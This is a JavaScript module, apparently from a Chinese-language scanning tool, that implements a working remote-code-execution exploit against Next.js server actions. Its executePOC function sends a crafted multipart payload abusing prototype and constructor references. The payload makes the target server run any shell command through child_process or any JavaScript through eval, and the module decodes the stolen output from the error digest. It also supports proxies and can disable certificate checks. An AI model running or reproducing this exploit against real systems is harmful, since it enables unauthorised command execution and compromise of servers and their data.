import axios from 'axios'
import FormData from 'form-data'
import iconv from 'iconv-lite'
import { POC_NO_RESPONSE } from './error-codes.js'

/**
 * 自适应编码解码函数
 * 尝试多种编码方式解码内容
 */
function autoDecode(content) {
  if (!content || typeof content !== 'string') {
    return content
  }

  // 如果包含 | 分隔符，说明是 BASE64_BYTES|PLATFORM 格式
  if (content.includes('|')) {
    try {
      const [base64BytesStr, osPlatform] = content.split('|', 2)
      const originalBytes = Buffer.from(base64BytesStr, 'base64')
      const encoding = osPlatform === 'win32' ? 'gbk' : 'utf-8'
      return iconv.decode(originalBytes, encoding).replace(/\0/g, '')
    } catch (e) {
      console.error('Base64 解码失败:', e)
    }
  }

  // 检测是否包含乱码字符（常见的中文乱码模式）
  // 检测模式：包含拉丁字符序列，但不包含正确的中文字符
  const hasGarbledText =
    /[\u00C0-\u00FF\u0080-\u00BF]{3,}/.test(content) &&
    !/^[\x00-\x7F]*$/.test(content) && // 不是纯 ASCII
    !/[\u4E00-\u9FFF]/.test(content) // 不包含正确的中文字符

  // 如果包含乱码，尝试修复
  if (hasGarbledText) {
    // 方法1: 尝试将当前字符串按 Latin1 编码为字节，然后用 GBK 解码
    // 这适用于 GBK 编码的字节被错误地用 Latin1/UTF-8 读取的情况
    try {
      const latin1Bytes = Buffer.from(content, 'latin1')
      const gbkDecoded = iconv.decode(latin1Bytes, 'gbk')
      // 如果解码后包含中文字符且没有替换字符，说明修复成功
      if (/[\u4E00-\u9FFF]/.test(gbkDecoded) && !/[\uFFFD]/.test(gbkDecoded)) {
        return gbkDecoded
      }
    } catch (e) {
      // 忽略错误，继续尝试其他方法
    }

    // 方法1.5: 尝试将字符串中的乱码部分单独处理
    // 对于包含 "Command failed:" 的情况，只处理后面的乱码部分
    try {
      if (content.includes('Command failed:')) {
        const parts = content.split('Command failed:')
        if (parts.length === 2) {
          const prefix = parts[0] + 'Command failed:'
          const garbledPart = parts[1]
          // 尝试修复乱码部分
          const latin1Bytes = Buffer.from(garbledPart, 'latin1')
          const gbkDecoded = iconv.decode(latin1Bytes, 'gbk')
          if (/[\u4E00-\u9FFF]/.test(gbkDecoded) && !/[\uFFFD]/.test(gbkDecoded)) {
            return prefix + gbkDecoded
          }
        }
      }
    } catch (e) {
      // 忽略错误
    }

    // 方法2: 尝试将字符串按 UTF-8 编码为字节，然后用 GBK 解码
    // 这适用于 GBK 字符串被错误地用 UTF-8 读取的情况
    try {
      const utf8Bytes = Buffer.from(content, 'utf-8')
      const gbkDecoded = iconv.decode(utf8Bytes, 'gbk')
      if (/[\u4E00-\u9FFF]/.test(gbkDecoded) && !/[\uFFFD]/.test(gbkDecoded)) {
        return gbkDecoded
      }
    } catch (e) {
      // 忽略错误
    }

    // 方法3: 尝试将字符串按 UTF-8 编码为字节，然后用 GB18030 解码
    try {
      const utf8Bytes = Buffer.from(content, 'utf-8')
      const gb18030Decoded = iconv.decode(utf8Bytes, 'gb18030')
      if (/[\u4E00-\u9FFF]/.test(gb18030Decoded) && !/[\uFFFD]/.test(gb18030Decoded)) {
        return gb18030Decoded
      }
    } catch (e) {
      // 忽略错误
    }

    // 方法4: 尝试其他编码方式（Latin1 -> 其他中文编码）
    const encodings = ['gb2312', 'gb18030', 'big5']
    for (const encoding of encodings) {
      try {
        const latin1Bytes = Buffer.from(content, 'latin1')
        const decoded = iconv.decode(latin1Bytes, encoding)
        if (/[\u4E00-\u9FFF]/.test(decoded) && !/[\uFFFD]/.test(decoded)) {
          return decoded
        }
      } catch (e) {
        // 继续尝试下一个编码
      }
    }

    // 方法5: 尝试直接检测并修复常见的乱码模式
    // 如果内容看起来像是 GBK 编码被错误解码，尝试重新编码
    try {
      // 将字符串按 UTF-8 编码为字节数组
      const bytes = []
      for (let i = 0; i < content.length; i++) {
        const code = content.charCodeAt(i)
        if (code < 0x80) {
          bytes.push(code)
        } else if (code < 0x800) {
          bytes.push(0xc0 | (code >> 6))
          bytes.push(0x80 | (code & 0x3f))
        } else {
          bytes.push(0xe0 | (code >> 12))
          bytes.push(0x80 | ((code >> 6) & 0x3f))
          bytes.push(0x80 | (code & 0x3f))
        }
      }
      // 尝试将这些字节按 GBK 解码
      const gbkBuffer = Buffer.from(bytes)
      const gbkDecoded = iconv.decode(gbkBuffer, 'gbk')
      if (/[\u4E00-\u9FFF]/.test(gbkDecoded) && !/[\uFFFD]/.test(gbkDecoded)) {
        return gbkDecoded
      }
    } catch (e) {
      // 忽略错误
    }
  }

  // 如果所有尝试都失败，返回原内容
  return content
}

/**
 * 从响应中提取 digest 字段的内容
 */
function extractDigest(responseText) {
  if (!responseText) return null

  // 方式1: 尝试解析JSON格式的响应
  try {
    const lines = responseText.split('\n')
    for (const line of lines) {
      if (line.includes('digest')) {
        const jsonStart = line.indexOf('{')
        if (jsonStart !== -1) {
          let braceCount = 0
          let jsonStr = ''
          for (let i = jsonStart; i < line.length; i++) {
            const char = line[i]
            jsonStr += char
            if (char === '{') {
              braceCount++
            } else if (char === '}') {
              braceCount--
              if (braceCount === 0) {
                try {
                  const obj = JSON.parse(jsonStr)
                  if (obj.digest) {
                    return obj.digest
                  }
                } catch (e) {
                  // 忽略解析错误
                }
                break
              }
            }
          }
        }
      }
    }
  } catch (e) {
    // 忽略错误
  }

  // 方式2: 使用正则表达式提取
  const pattern = /"digest"\s*:\s*"((?:[^"\\]|\\.|\\u[0-9a-fA-F]{4})*)"/s
  const match = responseText.match(pattern)
  if (match) {
    try {
      return JSON.parse(`"${match[1]}"`)
    } catch (e) {
      return match[1]
        .replace(/\\"/g, '"')
        .replace(/\\'/g, "'")
        .replace(/\\n/g, '\n')
        .replace(/\\t/g, '\t')
        .replace(/\\r/g, '\r')
    }
  }

  return null
}

/**
 * 从响应中提取 message 字段的内容
 */
function extractMessage(responseText) {
  if (!responseText) return null

  try {
    const lines = responseText.split('\n')
    for (const line of lines) {
      if (line.includes('message') && line.includes('Error')) {
        const jsonStart = line.indexOf('{')
        if (jsonStart !== -1) {
          let braceCount = 0
          let jsonStr = ''
          for (let i = jsonStart; i < line.length; i++) {
            const char = line[i]
            jsonStr += char
            if (char === '{') {
              braceCount++
            } else if (char === '}') {
              braceCount--
              if (braceCount === 0) {
                try {
                  const obj = JSON.parse(jsonStr)
                  if (obj.message) {
                    return obj.message
                  }
                } catch (e) {
                  // 忽略解析错误
                }
                break
              }
            }
          }
        }
      }
    }
  } catch (e) {
    // 忽略错误
  }

  // 使用正则表达式提取
  const pattern = /"message"\s*:\s*"((?:[^"\\]|\\.|\\u[0-9a-fA-F]{4})*)"/s
  const match = responseText.match(pattern)
  if (match) {
    try {
      return JSON.parse(`"${match[1]}"`)
    } catch (e) {
      return match[1]
        .replace(/\\"/g, '"')
        .replace(/\\'/g, "'")
        .replace(/\\n/g, '\n')
        .replace(/\\t/g, '\t')
        .replace(/\\r/g, '\r')
    }
  }

  return null
}

/**
 * 修复响应文本中的 message 字段编码问题
 * 在提取字段之前就修复乱码，避免后续处理中的编码问题
 */
function fixMessageEncodingInResponse(responseText) {
  if (!responseText) return responseText

  try {
    // 查找包含 message 字段的 JSON 行
    const lines = responseText.split('\n')
    const fixedLines = lines.map((line) => {
      // 检查是否包含 message 字段和 Error
      if (
        line.includes('"message"') &&
        (line.includes('"name":"Error"') || line.includes("'name':'Error'"))
      ) {
        try {
          // 尝试提取并修复 message 字段
          const messageMatch = line.match(/"message"\s*:\s*"((?:[^"\\]|\\.|\\u[0-9a-fA-F]{4})*)"/s)
          if (messageMatch) {
            const originalMessage = messageMatch[1]
            // 先尝试 JSON 解析（处理转义字符）
            let decodedMessage
            try {
              decodedMessage = JSON.parse(`"${originalMessage}"`)
            } catch (e) {
              // 如果 JSON 解析失败，手动处理转义字符
              decodedMessage = originalMessage
                .replace(/\\"/g, '"')
                .replace(/\\'/g, "'")
                .replace(/\\n/g, '\n')
                .replace(/\\t/g, '\t')
                .replace(/\\r/g, '\r')
            }

            // 尝试修复乱码
            const fixedMessage = autoDecode(decodedMessage)

            // 如果修复成功（包含中文字符），替换原 message
            if (fixedMessage !== decodedMessage && /[\u4E00-\u9FFF]/.test(fixedMessage)) {
              // 重新转义并替换
              const escapedMessage = JSON.stringify(fixedMessage).slice(1, -1) // 去掉引号
              return line.replace(messageMatch[0], `"message":"${escapedMessage}"`)
            }
          }
        } catch (e) {
          // 如果修复失败，保持原样
          console.error('修复 message 编码失败:', e)
        }
      }
      return line
    })

    return fixedLines.join('\n')
  } catch (e) {
    // 如果整体修复失败，返回原响应
    console.error('修复响应文本失败:', e)
    return responseText
  }
}

/**
 * 执行 POC 检测
 * @param {string} url - 目标 URL
 * @param {string} command - 要执行的命令
 * @param {object} settings - 用户设置（超时、代理、SSL证书等）
 */
export async function executePOC(url, command, settings = null) {
  // 保存原始的 TLS 设置
  const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED

  try {
    // 调试日志：打印设置信息
    console.log('executePOC - 接收到的设置:', {
      ignoreCertErrors: settings?.ignoreCertErrors,
      proxyEnabled: settings?.proxyEnabled,
      timeout: settings?.timeout
    })

    // 如果需要忽略证书错误，在全局层面设置（作为最后的手段）
    if (settings?.ignoreCertErrors) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
      console.log('✓ 已在全局层面禁用 TLS 证书验证')
    }

    // 应用设置中的超时时间，默认 10000ms
    const timeout = settings?.timeout || 10000

    // 构建 axios 配置
    const axiosConfig = {
      timeout,
      responseType: 'text',
      validateStatus: () => true // 接受所有状态码
    }

    // 应用代理设置
    if (settings?.proxyEnabled && settings?.proxyHost && settings?.proxyPort) {
      const { HttpsProxyAgent } = await import('https-proxy-agent')
      const { SocksProxyAgent } = await import('socks-proxy-agent')

      let proxyUrl = ''
      if (settings.proxyAuth && settings.proxyUsername) {
        proxyUrl = `${settings.proxyProtocol}://${settings.proxyUsername}:${settings.proxyPassword}@${settings.proxyHost}:${settings.proxyPort}`
      } else {
        proxyUrl = `${settings.proxyProtocol}://${settings.proxyHost}:${settings.proxyPort}`
      }

      // 准备 TLS 选项 - 当忽略证书错误时，需要额外配置
      const tlsOptions = settings?.ignoreCertErrors
        ? {
            rejectUnauthorized: false,
            // 禁用 SNI（Server Name Indication）检查，允许 IP 地址
            servername: undefined,
            // 禁用主机名检查
            checkServerIdentity: () => undefined
          }
        : {
            rejectUnauthorized: true
          }

      if (settings.proxyProtocol === 'socks5') {
        // SOCKS5 代理配置 - SOCKS5 支持 http 和 https
        const socksAgent = new SocksProxyAgent(proxyUrl, tlsOptions)
        axiosConfig.httpsAgent = socksAgent
        axiosConfig.httpAgent = socksAgent
        console.log('✓ 已配置 SOCKS5 代理，TLS 选项:', tlsOptions)
      } else {
        // HTTP/HTTPS 代理配置 - 只为 https 设置 agent
        const httpsAgent = new HttpsProxyAgent(proxyUrl, tlsOptions)
        axiosConfig.httpsAgent = httpsAgent
        // 对于 http 请求，使用简单的 HTTP 代理（不需要 TLS 选项）
        if (url.startsWith('http://')) {
          const http = await import('http')
          const httpProxyUrl = new URL(proxyUrl)
          axiosConfig.httpAgent = new http.Agent({
            host: httpProxyUrl.hostname,
            port: httpProxyUrl.port
          })
        }
        console.log('✓ 已配置 HTTP/HTTPS 代理，TLS 选项:', tlsOptions)
      }
    }
    // 如果没有代理但需要忽略 SSL 证书错误（仅对 https）
    else if (settings?.ignoreCertErrors && url.startsWith('https://')) {
      const https = await import('https')
      const agent = new https.Agent({
        rejectUnauthorized: false,
        // 禁用 SNI 检查，允许 IP 地址
        servername: undefined,
        // 禁用主机名检查
        checkServerIdentity: () => undefined
      })
      axiosConfig.httpsAgent = agent
      console.log('✓ 已配置忽略 SSL 证书错误（无代理），包含 SNI 和主机名检查禁用')
    }

    let encodingConversionCode

    // 检查是否是特殊的 JavaScript 执行命令
    if (command.startsWith('__EVAL__:')) {
      // 直接执行 JavaScript 代码
      const base64Code = command.substring(9) // 移除 '__EVAL__:' 前缀
      encodingConversionCode = `var code = Buffer.from('${base64Code}', 'base64').toString('utf8');eval(code);var jsonResult = JSON.stringify({payload:'', result:true, platform:process.platform});throw Object.assign(new Error('NEXT_REDIRECT'), {digest: jsonResult});`
    } else {
      // 正常的命令执行
      // 构建 Node.js 代码来执行命令
      // 使用 JSON 格式返回信息：{payload:"base64命令结果", result:true/false, platform:"平台"}
      const escapedCmd = JSON.stringify(command)
      encodingConversionCode = `var cp = process.mainModule.require('child_process');var platform = process.platform;var cmd = ${escapedCmd};var result = cp.spawnSync(cmd, [], {'timeout':5000, encoding:'buffer', stdio:['ignore','pipe','pipe'], shell:true});var output = null;var success = false;if(result.stdout && result.stdout.length > 0){output = result.stdout;success = result.status === 0;}else if(result.stderr && result.stderr.length > 0){output = result.stderr;success = false;}if(output){var base64Bytes = output.toString('base64');var jsonResult = JSON.stringify({payload:base64Bytes, result:success, platform:platform});throw Object.assign(new Error('NEXT_REDIRECT'), {digest: jsonResult});}else{var jsonResult = JSON.stringify({payload:'', result:false, platform:platform});throw Object.assign(new Error('NEXT_REDIRECT'), {digest: jsonResult});}`
    }

    const craftedChunk = {
      then: '$1:__proto__:then',
      status: 'resolved_model',
      reason: -1,
      value: '{"then": "$B0"}',
      _response: {
        _prefix: encodingConversionCode,
        _formData: {
          get: '$1:constructor:constructor'
        }
      }
    }

    // 创建 FormData
    const formData = new FormData()
    formData.append('0', JSON.stringify(craftedChunk))
    formData.append('1', '"$@0"')

    // 发送请求
    // 使用 validateStatus 接受所有状态码，确保无论什么状态码都能获取响应内容
    let responseText = ''
    let statusCode = 0

    try {
      const response = await axios.post(url, formData, {
        ...axiosConfig,
        headers: {
          'Next-Action': 'x',
          ...formData.getHeaders()
        }
      })

      // 无论状态码是什么，都获取响应内容
      responseText = response.data || ''
      statusCode = response.status || 0
    } catch (error) {
      // 即使设置了 validateStatus，某些情况下 axios 仍可能抛出错误
      // 如果有响应对象，说明是 HTTP 响应，应该提取响应内容（500 等状态码是正常的）
      if (error.response) {
        // 有响应对象，提取响应内容和状态码（500 等错误状态码是正常的）
        // 这是正常情况，不应该被视为错误
        responseText = error.response.data || ''
        statusCode = error.response.status || 500
        // 不抛出错误，继续处理响应内容
        // 注意：即使 axios 抛出错误，只要有 response，我们就继续处理
      } else if (error.request) {
        // 请求已发出但没有收到响应（网络错误）
        // 这种情况下才返回错误
        return {
          status_code: 0,
          response: `网络错误: ${error.message}`,
          is_vulnerable: false,
          digest_content: '',
          command_failed: false,
          failure_reason: ''
        }
      } else {
        // 其他错误（配置错误等）
        return {
          status_code: 0,
          response: `请求错误: ${error.message}`,
          is_vulnerable: false,
          digest_content: '',
          command_failed: false,
          failure_reason: ''
        }
      }
    }

    // 确保 responseText 不为空字符串时才继续处理
    // 如果 responseText 为空，可能是真正的错误
    if (!responseText && statusCode === 0) {
      return {
        status_code: 0,
        response: POC_NO_RESPONSE,
        is_vulnerable: false,
        digest_content: '',
        command_failed: false,
        failure_reason: ''
      }
    }

    // 在提取字段之前，先修复响应文本中的 message 字段编码问题
    // 这样可以确保后续提取的 message 已经是修复后的内容
    if (responseText) {
      responseText = fixMessageEncodingInResponse(responseText)
    }

    // 判断是否存在漏洞
    let isVulnerable = false
    let digestContent = null
    let messageContent = null
    let commandFailed = false
    let failureReason = null
    let platform = null

    if (responseText) {
      const hasDigest = responseText.includes('"digest"') || responseText.includes("'digest'")
      const hasMessage = responseText.includes('"message"') || responseText.includes("'message'")
      const hasNextRedirect = responseText.includes('NEXT_REDIRECT')
      const hasError =
        responseText.includes('"name":"Error"') || responseText.includes("'name':'Error'")

      // 提取 digest 和 message
      digestContent = extractDigest(responseText)
      messageContent = extractMessage(responseText)

      // 检测命令是否执行失败（参考 Python 版本的处理方式）
      if (messageContent) {
        if (
          messageContent.includes('Command failed') ||
          messageContent.toLowerCase().includes('command failed')
        ) {
          commandFailed = true
          // 提取失败原因（参考 Python 版本）
          if (messageContent.includes('Command failed:')) {
            failureReason = messageContent.split('Command failed:', 1)[1].trim()
          } else if (messageContent.toLowerCase().includes('command failed:')) {
            failureReason = messageContent.split(/command failed:/i, 1)[1].trim()
          } else {
            failureReason = messageContent
          }
        }
      }

      // 判断是否存在漏洞（参考 Python 版本）
      if (hasDigest && digestContent && digestContent.trim().length > 0) {
        isVulnerable = true
      } else if (
        hasMessage &&
        messageContent &&
        messageContent.trim().length > 0 &&
        messageContent !== 'NEXT_REDIRECT'
      ) {
        // 如果 message 是 "NEXT_REDIRECT"，说明错误信息在 digest 中，不使用 message
        isVulnerable = true
        if (!digestContent) {
          digestContent = messageContent
        }
      } else if (hasDigest && hasNextRedirect && hasError) {
        isVulnerable = true
        if (!digestContent) {
          digestContent = extractDigest(responseText)
        }
        if (!digestContent && !messageContent) {
          messageContent = extractMessage(responseText)
          if (messageContent && messageContent !== 'NEXT_REDIRECT') {
            digestContent = messageContent
          }
        }
      }

      // 处理 JSON 格式的返回信息：{payload:"base64命令结果", result:true/false, platform:"平台"}
      if (digestContent) {
        try {
          // 尝试解析 JSON
          const jsonResult = JSON.parse(digestContent)
          console.log('解析 digest JSON:', jsonResult)
          if (
            jsonResult.payload !== undefined &&
            jsonResult.result !== undefined &&
            jsonResult.platform !== undefined
          ) {
            // 这是新的 JSON 格式
            const base64BytesStr = jsonResult.payload
            const osPlatform = jsonResult.platform
            const commandSuccess = jsonResult.result === true

            // 保存平台信息
            platform = osPlatform
            console.log('提取到平台信息:', platform)

            // 解码 payload
            if (base64BytesStr) {
              try {
                const originalBytes = Buffer.from(base64BytesStr, 'base64')
                // 根据平台判断原始编码
                if (osPlatform === 'win32') {
                  // Windows 系统通常是 GBK 编码
                  digestContent = iconv.decode(originalBytes, 'gbk').replace(/\0/g, '')
                } else {
                  // 其他系统（Linux/macOS）通常是 UTF-8
                  digestContent = iconv.decode(originalBytes, 'utf-8').replace(/\0/g, '')
                }

                // 根据 result 判断命令是否成功
                if (!commandSuccess) {
                  commandFailed = true
                  failureReason = digestContent
                }
              } catch (e) {
                console.error('Base64 解码失败:', e)
                digestContent = ''
              }
            } else {
              digestContent = ''
            }
          } else {
            // 不是新的 JSON 格式，使用旧的格式处理（兼容性）
            if (digestContent.includes('|')) {
              try {
                const [base64BytesStr, osPlatform] = digestContent.split('|', 2)
                const originalBytes = Buffer.from(base64BytesStr, 'base64')
                if (osPlatform === 'win32') {
                  digestContent = iconv.decode(originalBytes, 'gbk').replace(/\0/g, '')
                } else {
                  digestContent = iconv.decode(originalBytes, 'utf-8').replace(/\0/g, '')
                }
              } catch (e) {
                console.error('Base64 解码失败:', e)
              }
            } else {
              // 如果不是 base64 编码，尝试自适应解码（处理直接乱码的情况）
              digestContent = autoDecode(digestContent)
            }
          }
        } catch (e) {
          // JSON 解析失败，使用旧的格式处理（兼容性）
          if (digestContent.includes('|')) {
            try {
              const [base64BytesStr, osPlatform] = digestContent.split('|', 2)
              const originalBytes = Buffer.from(base64BytesStr, 'base64')
              if (osPlatform === 'win32') {
                digestContent = iconv.decode(originalBytes, 'gbk').replace(/\0/g, '')
              } else {
                digestContent = iconv.decode(originalBytes, 'utf-8').replace(/\0/g, '')
              }
            } catch (err) {
              console.error('Base64 解码失败:', err)
            }
          } else {
            // 如果不是 base64 编码，尝试自适应解码（处理直接乱码的情况）
            digestContent = autoDecode(digestContent)
          }
        }
      }

      // 处理失败原因的 base64 编码（参考 Python 版本）
      if (failureReason && failureReason.includes('|')) {
        try {
          const [base64BytesStr, osPlatform] = failureReason.split('|', 2)
          const originalBytes = Buffer.from(base64BytesStr, 'base64')
          if (osPlatform === 'win32') {
            failureReason = iconv.decode(originalBytes, 'gbk').replace(/\0/g, '')
          } else {
            failureReason = iconv.decode(originalBytes, 'utf-8').replace(/\0/g, '')
          }
        } catch (e) {
          console.error('解码失败原因失败:', e)
        }
      } else if (failureReason) {
        // 如果不是 base64 编码，尝试自适应解码（处理直接乱码的情况）
        failureReason = autoDecode(failureReason)
      }

      // 处理 message 内容（参考 Python 版本）
      // 注意：由于已经在 fixMessageEncodingInResponse 中修复了响应文本，
      // 这里提取的 message 应该已经是修复后的内容
      // 但为了处理 base64 编码的情况，仍然需要检查
      if (messageContent) {
        // 先处理 base64 编码（格式：BASE64_BYTES|PLATFORM）
        if (messageContent.includes('|')) {
          try {
            const [base64BytesStr, osPlatform] = messageContent.split('|', 2)
            const originalBytes = Buffer.from(base64BytesStr, 'base64')
            if (osPlatform === 'win32') {
              messageContent = iconv.decode(originalBytes, 'gbk').replace(/\0/g, '')
            } else {
              messageContent = iconv.decode(originalBytes, 'utf-8').replace(/\0/g, '')
            }
          } catch (e) {
            console.error('Message Base64 解码失败:', e)
            // 如果 base64 解码失败，尝试自适应解码（作为备用）
            messageContent = autoDecode(messageContent)
          }
        }
        // 如果不是 base64 编码，message 应该已经在 fixMessageEncodingInResponse 中修复了
        // 但为了安全起见，如果仍然包含乱码，再次尝试修复
        else if (
          /[\u00C0-\u00FF\u0080-\u00BF]{3,}/.test(messageContent) &&
          !/[\u4E00-\u9FFF]/.test(messageContent)
        ) {
          messageContent = autoDecode(messageContent)
        }
      }

      // 如果 digest 是纯数字且 name 为 Error，使用 message 作为 digestContent（参考用户需求）
      // 但如果 message 是 "NEXT_REDIRECT"，说明错误信息在 digest 中（base64 编码），不使用 message
      if (
        digestContent &&
        /^\d+$/.test(digestContent.trim()) &&
        hasError &&
        messageContent &&
        messageContent !== 'NEXT_REDIRECT'
      ) {
        digestContent = messageContent
      }

      // 如果命令失败，优先使用 digestContent（已解码的错误信息）
      // 如果 message 是 "NEXT_REDIRECT"，说明错误信息在 digest 中
      if (commandFailed) {
        if (digestContent && (!messageContent || messageContent === 'NEXT_REDIRECT')) {
          // digestContent 已经包含错误信息，直接使用
          // 不需要额外处理
        } else if (
          messageContent &&
          messageContent !== 'NEXT_REDIRECT' &&
          (!digestContent || /^\d+$/.test(digestContent.trim()))
        ) {
          // 如果 message 不是 "NEXT_REDIRECT" 且包含错误信息，使用 message
          digestContent = messageContent
        }
      }

      // 处理完整响应中的乱码 - 尝试修复 responseText 中的 message 字段
      if (responseText && messageContent && hasError) {
        try {
          // 尝试解析包含 Error 的 JSON 行并修复 message
          const lines = responseText.split('\n')
          const fixedLines = lines.map((line) => {
            if (line.includes('"name":"Error"') || line.includes("'name':'Error'")) {
              try {
                const jsonStart = line.indexOf('{')
                if (jsonStart !== -1) {
                  let braceCount = 0
                  let jsonStr = ''
                  for (let i = jsonStart; i < line.length; i++) {
                    const char = line[i]
                    jsonStr += char
                    if (char === '{') {
                      braceCount++
                    } else if (char === '}') {
                      braceCount--
                      if (braceCount === 0) {
                        try {
                          const obj = JSON.parse(jsonStr)
                          if (obj.message && obj.name === 'Error') {
                            // 替换为解码后的 message
                            obj.message = messageContent
                            // 重新序列化
                            const prefix = line.substring(0, jsonStart)
                            const suffix = line.substring(i + 1)
                            return prefix + JSON.stringify(obj) + suffix
                          }
                        } catch (e) {
                          // 解析失败，保持原样
                        }
                        break
                      }
                    }
                  }
                }
              } catch (e) {
                // 处理失败，保持原样
              }
            }
            return line
          })
          responseText = fixedLines.join('\n')
        } catch (e) {
          // 如果修复失败，保持原响应
          console.error('修复响应中的 message 失败:', e)
        }
      }
    }

    console.log('返回结果 - platform:', platform)
    return {
      status_code: statusCode,
      response: responseText,
      is_vulnerable: isVulnerable,
      digest_content: digestContent || '',
      command_failed: commandFailed,
      failure_reason: failureReason || '',
      platform: platform
    }
  } catch (error) {
    console.error('POC 执行错误:', error)
    return {
      status_code: 0,
      response: `请求错误: ${error.message}`,
      is_vulnerable: false,
      digest_content: '',
      command_failed: false,
      failure_reason: '',
      platform: null
    }
  } finally {
    // 恢复原始的 TLS 设置
    if (originalRejectUnauthorized !== undefined) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized
    } else {
      delete process.env.NODE_TLS_REJECT_UNAUTHORIZED
    }
  }
}
